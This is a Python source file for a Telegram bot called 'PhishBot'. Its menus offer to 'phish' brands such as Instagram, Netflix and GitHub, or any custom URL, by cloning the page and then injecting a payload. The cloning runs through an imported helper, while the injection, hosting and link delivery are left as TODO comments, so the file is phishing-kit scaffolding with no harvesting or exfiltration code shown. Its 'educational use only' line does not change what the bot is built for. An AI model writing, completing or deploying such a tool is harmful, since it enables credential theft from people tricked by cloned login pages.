from flask import Flask
import threading
import telebot
from telebot import types
import os
from sel import clone_page
from is_ob import is_obfuscated

API_TOKEN = 'your_bot_token_here'
bot = telebot.TeleBot(API_TOKEN)

app = Flask(__name__)

TEMPLATES = [
    "Instagram", "Facebook", "Netflix", "Twitter", "Snapchat",
    "GitHub", "LinkedIn", "Spotify", "Reddit", "Amazon", "Custom URL"
]

user_states = {}

@app.route('/')
def home():
    return "🤖 Bot is running on Flask server!"

# -------------------- BOT HANDLERS --------------------

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, (
        "🎣 Welcome to PhishBot!\n\n"
        "Available commands:\n"
        "/fish - Start phishing setup\n"
        "/help - Show help\n"
        "/info - About the bot"
    ))

@bot.message_handler(commands=['info'])
def send_info(message):
    bot.reply_to(message, "🤖 This bot helps simulate phishing pages. Use /fish to begin (for educational use only).")

@bot.message_handler(commands=['fish'])
def send_fish_menu(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    buttons = [types.KeyboardButton(site) for site in TEMPLATES]
    markup.add(*buttons)
    bot.send_message(message.chat.id, "📄 Choose a site to phish or select 'Custom URL':", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text in TEMPLATES)
def handle_template_selection(message):
    selected = message.text
    if selected == "Custom URL":
        user_states[message.chat.id] = "awaiting_url"
        bot.send_message(message.chat.id, "🌐 Please send the URL you want to clone.")
    else:
        bot.send_message(message.chat.id, f"✅ You selected: {selected}\n⚙️ Generating link...")
        # TODO: Add support for default templates

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "awaiting_url")
def handle_custom_url(message):
    url = message.text
    user_id = message.chat.id
    output_dir = f"clones/user_{user_id}"
    user_states.pop(user_id, None)

    bot.send_message(user_id, f"🔄 Cloning {url}...")

    filepath = clone_page(url, output_folder=output_dir)

    if filepath and os.path.exists(filepath):
        bot.send_message(user_id, f"✅ Page cloned! Checking for obfuscation...")

        with open(filepath, "r", encoding="utf-8") as f:
            html_content = f.read()

        if is_obfuscated(html_content):
            bot.send_message(user_id, "⚠️ The cloned page appears to be obfuscated. Cannot inject payload.")
        else:
            bot.send_message(user_id, "✅ The HTML looks clean. Proceeding with payload injection...")
            # TODO: Inject payload, host, send link
    else:
        bot.send_message(user_id, "❌ Failed to clone the page. Try another link.")

@bot.message_handler(func=lambda message: True)
def fallback(message):
    bot.reply_to(message, "❓ Unknown command. Use /start to see available options.")

# -------------------- RUN BOT IN BACKGROUND THREAD --------------------

def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=5000)
